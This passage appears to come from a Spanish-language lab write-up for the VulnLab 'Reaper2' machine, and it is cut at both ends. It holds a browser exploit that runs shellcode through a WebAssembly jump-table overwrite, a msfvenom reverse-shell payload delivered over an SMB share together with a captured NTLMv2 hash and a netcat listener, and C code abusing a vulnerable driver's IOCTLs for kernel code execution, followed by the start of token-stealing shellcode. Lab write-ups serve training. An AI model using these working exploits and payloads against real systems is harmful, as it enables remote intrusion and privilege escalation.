    obj_arr_addr</span><span class="o"> +=</span><span class="mi"> 4n</span><span class="p">;
}

</span><span class="no">let</span><span class="p"> wasmCode</span><span class="o"> = new</span><span class="na"> Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 96</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 3</span><span class="p">,</span><span class="mi"> 2</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 8</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 105</span><span class="p">,</span><span class="mi"> 110</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 10</span><span class="p">,</span><span class="mi"> 222</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 219</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 201</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 113</span><span class="p">,</span><span class="mi"> 96</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 118</span><span class="p">,</span><span class="mi"> 24</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 118</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 54</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 173</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 139</span><span class="p">,</span><span class="mi"> 88</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 185</span><span class="p">,</span><span class="mi"> 128</span><span class="p">,</span><span class="mi"> 18</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 203</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 104</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 120</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 192</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 114</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 100</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 114</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 104</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 117</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 101</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 184</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 56</span><span class="p">,</span><span class="mi"> 46</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 12</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 193</span><span class="p">,</span><span class="mi"> 224</span><span class="p">,</span><span class="mi"> 32</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 13</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 92</span><span class="p">,</span><span class="mi"> 49</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 144</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 137</span><span class="p">,</span><span class="mi"> 225</span><span class="p">,</span><span class="mi"> 106</span><span class="p">,</span><span class="mi"> 5</span><span class="p">,</span><span class="mi"> 90</span><span class="p">,</span><span class="mi"> 235</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 72</span><span class="p">,</span><span class="mi"> 131</span><span class="p">,</span><span class="mi"> 236</span><span class="p">,</span><span class="mi"> 48</span><span class="p">,</span><span class="mi"> 255</span><span class="p">,</span><span class="mi"> 211</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 11</span><span class="p">]);  
</span><span class="no">let</span><span class="p"> wasmModule</span><span class="o"> = new</span><span class="p"> WebAssembly.Module(wasmCode);
</span><span class="no">let</span><span class="p"> wasmInstance</span><span class="o"> = new</span><span class="p"> WebAssembly.Instance(wasmModule);
</span><span class="no">let</span><span class="p"> main</span><span class="o"> =</span><span class="p"> wasmInstance.exports.main;

</span><span class="no">let</span><span class="p"> wasmInstance_addr</span><span class="o"> =</span><span class="p"> addrof(wasmInstance);
</span><span class="no">let</span><span class="p"> jump_table_start</span><span class="o"> =</span><span class="p"> ftoi(aar(wasmInstance_addr</span><span class="o"> +</span><span class="mi"> 0x47n</span><span class="p">));
aaw(wasmInstance_addr </span><span class="o">+ </span><span class="mi">0x47n</span><span class="p">, jump_table_start</span><span class="o"> +</span><span class="mi"> 0x81an</span><span class="p">);

main();</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces simplemente podemos crear el archivo malicioso con <code class="language-plaintext highlighter-rouge">msfvenom</code> y lo compartimos a través del recurso <code class="language-plaintext highlighter-rouge">smb</code>, al enviar el exploit recibimos una revshell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -f exe -o shared.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shared.exe

</span><span class="ve">❯ sudo impacket-smbserver </span><span class="p">user . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.122.10,49864)
[*] AUTHENTICATE_MESSAGE (REAPER2\www,REAPER2)
[*] User REAPER2\www authenticated successfully
[*] www::REAPER2:aaaaaaaaaaaaaaaa:609972cb6621f7acd275c8ae15b98317:01010000000000000062f7157a61db018d12269761713b42000000000100100051005800470050007a006f0051004f000300100051005800470050007a006f0051004f0002001000630070006d0071004d0062007200640004001000630070006d0071004d00620072006400070008000062f7157a61db0106000400020000000800300030000000000000000000000000200000d315e0c9d8f68c15cd99f8ee3fdef1c4563c64203e40b4a3d1c1068bf9ad82bb0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0033002e003100310035000000000000000000  
[*] Connecting Share(1:user)
[*] Disconnecting Share(1:user)
[*] Closing down connection (10.10.122.10,49864)
[*] Remaining connections []</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.122.10 49947
Microsoft Windows [Version 10.0.20348.2402]
(c) Microsoft Corporation. All rights reserved.  

C:\> </span><span class="am">whoami</span><span class="p">
reaper2\www

C:\></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-system">
<br><h3 class="post-title">Shell - system</h3><br>

<p class="plain-text">En <code class="language-plaintext highlighter-rouge">C:\dev</code> podemos encontrar un controlador <code class="language-plaintext highlighter-rouge">Reaper.sys</code>, probablemente sea para la escalada asi que lo descargamos igual que el <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> para calcular offsets</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\dev> </span><span class="am">dir</span><span class="p">
 Volume in drive C has no label.
 Volume Serial Number is DC77-4AA2

 Directory of C:\dev

04/28/2024  11:29 AM    &ltDIR>          .
04/27/2024  03:31 AM             8,944 Reaper.sys
               1 File(s)          8,944 bytes
               1 Dir(s)   7,015,694,336 bytes free

C:\dev></span><span class="am"> copy </span><span class="p">Reaper.sys \\10.8.0.100\user\Reaper.sys
        1 file(s) copied.

C:\dev></span><span class="am"> copy </span><span class="p">C:\Windows\System32\ntoskrnl.exe \\10.8.0.100\user\ntoskrnl.exe  
        1 file(s) copied.

C:\dev></span>
</code></pre></div></div><br>

<p class="plain-text">Abrimos el driver en <code class="language-plaintext highlighter-rouge">IDA</code>, la función <code class="language-plaintext highlighter-rouge">DriverEntry</code> inicia llamando a 2 funciones sin simbolos, la primera solo comprueba una cookie asi que vamos con la segunda</p>
<a href="/vulnlab/reaper2/4.png" target="_blank"><div><p><img src="/vulnlab/reaper2/4.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">sub_11c8</code> inicia llamando a <code class="language-plaintext highlighter-rouge">RtlGetVersion</code> que se utiliza para obtener información sobre el sistema operativo que se está ejecutando actualmente</p>
<a href="/vulnlab/reaper2/5.png" target="_blank"><div><p><img src="/vulnlab/reaper2/5.png"></p></div></a>

<p class="plain-text">La interfaz con la que podemos comunicarnos con el driver son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, al instalar un driver utilizando la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> se establece un nombre de dispositivo, en el siguiente bloque podemos ver que se establece a <code class="language-plaintext highlighter-rouge">\\\\.\\Reaper</code></p>
<a href="/vulnlab/reaper2/6.png" target="_blank"><div><p><img src="/vulnlab/reaper2/6.png"></p></div></a>

<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta este tipo de llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este bloque podemos ver que la función establecida para encargarse de esta tarea es <code class="language-plaintext highlighter-rouge">sub_1020</code>, esta inicia haciendo comparaciones de varios códigos ioctl con sus saltos condicionales</p>
<a href="/vulnlab/reaper2/7.png" target="_blank"><div><p><img src="/vulnlab/reaper2/7.png"></p></div></a>

<p class="plain-text">Si el código ioctl es <code class="language-plaintext highlighter-rouge">0x80002003</code> realiza una comparación de un valor <code class="language-plaintext highlighter-rouge">Magic</code> con el dword <code class="language-plaintext highlighter-rouge">0x6a55cc9e</code>, si se cumple llama <code class="language-plaintext highlighter-rouge">ExAllocatePoolWithTag</code> que asigna un espacio en memoria del tipo <code class="language-plaintext highlighter-rouge">NonPagedPool</code> con un tamaño total de <code class="language-plaintext highlighter-rouge">0x28</code> y el tag <code class="language-plaintext highlighter-rouge">paeR</code></p>
<a href="/vulnlab/reaper2/8.png" target="_blank"><div><p><img src="/vulnlab/reaper2/8.png"></p></div></a>

    <p class="plain-text">Luego de ello crea una estructura <code class="language-plaintext highlighter-rouge">ReaperData</code> con valores en diferentes offsets, el primero de ellos es el valor <code class="language-plaintext highlighter-rouge">Magic</code> que tenemos que cumplir, algunos otros valores interesantes son campos de direcciones las cuales nos servirán más adelante</p>
<a href="/vulnlab/reaper2/9.png" target="_blank"><div><p><img src="/vulnlab/reaper2/9.png"></p></div></a>

<p class="plain-text">Podemos definirlo en <code class="language-plaintext highlighter-rouge">C</code> como una estructura donde los primeros <code class="language-plaintext highlighter-rouge">3</code> valores son <code class="language-plaintext highlighter-rouge">dwords</code>, luego un <code class="language-plaintext highlighter-rouge">dword</code> sin usar y finalmente las direcciones con sus tamaños</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct</span><span class="p"> ReaperData {
    </span><span class="na">DWORD</span><span class="p"> Magic;
    </span><span class="na">DWORD</span><span class="p"> ThreadId;
    </span><span class="na">DWORD</span><span class="p"> Priority;
    </span><span class="na">DWORD</span><span class="p"> Empty;
    </span><span class="na">QWORD</span><span class="p"> ExecAddress;
    </span><span class="na">DWORD</span><span class="p"> SrcRegister;
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
} </span><span class="na">ReaperData</span>
</code></pre></div></div><br>

<p class="plain-text">Si el código ioctl es igual a <code class="language-plaintext highlighter-rouge">0x80002007</code> llama a la función <code class="language-plaintext highlighter-rouge">ExFreePoolWithTag</code> que libera el bloque de memoria del <code class="language-plaintext highlighter-rouge">pool</code> que se asigno con el tag anteriormente</p>
<a href="/vulnlab/reaper2/10.png" target="_blank"><div><p><img src="/vulnlab/reaper2/10.png"></p></div></a>

<p class="plain-text">Cuando el código es <code class="language-plaintext highlighter-rouge">0x8000200f</code> se ejecuta la instrucción <code class="language-plaintext highlighter-rouge">rdmsr</code> que lee el valor de un registro <code class="language-plaintext highlighter-rouge">MSR</code> que le pasemos depositando su valor en el campo <code class="language-plaintext highlighter-rouge">DstAddress</code></p>
<a href="/vulnlab/reaper2/11.png" target="_blank"><div><p><img src="/vulnlab/reaper2/11.png"></p></div></a>

<p class="plain-text">El código <code class="language-plaintext highlighter-rouge">0x8000200b</code> llama a <code class="language-plaintext highlighter-rouge">PsLookupThreadByThreadId</code> acepta el id de un hilo y devuelve el puntero a la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, luego llama a <code class="language-plaintext highlighter-rouge">KeSetPriorityThread</code> establece la prioridad de tiempo de ejecución del hilo creado, finalmente llama a la función <code class="language-plaintext highlighter-rouge">ObDeferenceObject</code> disminuye el numero de referencias al objeto dado</p>
<a href="/vulnlab/reaper2/12.png" target="_blank"><div><p><img src="/vulnlab/reaper2/12.png"></p></div></a>

<p class="plain-text">Luego de guardar en <code class="language-plaintext highlighter-rouge">rax</code> llama a la función <code class="language-plaintext highlighter-rouge">_guard_dispatch_icall_nop</code> que ejecuta una instrucción <code class="language-plaintext highlighter-rouge">jmp rax</code>, podemos controlar una dirección para que se ejecute</p>
<a href="/vulnlab/reaper2/15.png" target="_blank"><div><p><img src="/vulnlab/reaper2/15.png"></p></div></a>

<p class="plain-text">Entonces, tenemos <code class="language-plaintext highlighter-rouge">3</code> códigos ioctl, <code class="language-plaintext highlighter-rouge">2</code> de ellos para asignar y liberar un bloque de memoria, otro nos permite leer un registro <code class="language-plaintext highlighter-rouge">MSR</code> y otro ejecutar cualquier dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define</span><span class="na"> IOCTL_EXEC</span><span class="mi"> 0x8000200b
</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi"> 0x80002007
</span><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003
</span><span class="o">#define</span><span class="na"> IOCTL_READMSR</span><span class="mi"> 0x8000200f</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ExecuteAddress</code> nos permite ejecutar una dirección, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> la dirección que se recibe como argumento la pasamos en el campo <code class="language-plaintext highlighter-rouge">ExecAddress</code> y luego de eso llamamos a los <code class="language-plaintext highlighter-rouge">3</code> códigos <code class="language-plaintext highlighter-rouge">ioctl</code> los cuales nos llevarán a la ejecución de esta dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">VOID ExecuteAddress</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> addr</span><span class="p">) {
    ReaperData userData;
    
    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
    userData.ExecAddress </span><span class="o">= </span><span class="p">addr;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  
    DeviceIoControl(hDevice, IOCTL_EXEC, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ReadMSR</code> recibe el registro a leer como argumento que le pasamos en el campo <code class="language-plaintext highlighter-rouge">SrcRegister</code> y en <code class="language-plaintext highlighter-rouge">DstAddress</code> la dirección donde almacenará su valor, si la dirección de destino apunta a la variable <code class="language-plaintext highlighter-rouge">output</code> podemos obtener su valor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD ReadMSR</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> reg</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    ReaperData userData;

    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
    userData.ThreadId </span><span class="o">= </span><span class="p">GetCurrentThreadId();
    userData.Priority </span><span class="o">= </span><span class="mi">0</span><span class="p">;
    userData.SrcRegister </span><span class="o">= </span><span class="p">reg;
    userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;

    DeviceIoControl(hDevice, IOCTL_ALLOC, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    DeviceIoControl(hDevice, IOCTL_READMSR, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData,</span><span class="o"> sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  
    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}</span>
</code></pre></div></div><br>

<p class="plain-text">La función main llama a <code class="language-plaintext highlighter-rouge">ExecuteAddress</code> hacia la dirección <code class="language-plaintext highlighter-rouge">0x4141414141414141</code>, lo ejecutamos y al llegar al <code class="language-plaintext highlighter-rouge">jmp rax</code> intenta saltar a la dirección que le pasamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    ExecuteAddress(hDevice, </span><span class="mi">0x4141414141414141</span><span class="p">);
    CloseHandle(hDevice);
}</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> bp Reaper + 0x1500

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
Reaper+0x1500:
fffff806`2e041500 ffe0            jmp     rax  

</span><span class="ro">0: kd></span><span class="p"> r rax
rax=4141414141414141</span>
</code></pre></div></div><br>

<p class="plain-text">El shellcode de <a href="/exploit-development/windows-kernel/token-stealing">token stealing</a> copiará el token del proceso <code class="language-plaintext highlighter-rouge">System</code> hacia el proceso actual, antes de ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> restauraremos el stack desde el registro <code class="language-plaintext highlighter-rouge">rdx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">64</span><span class="p">] </span><span class="o">=</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rax, [gs:0x188]              ; $rax = _KTHREAD</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rax + 0xb8]            ; $rax = _EPROCESS</span><span class="p">
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS</span><span class="p">
                                                          </span><span class="c1">// .loop:</span><span class="p">
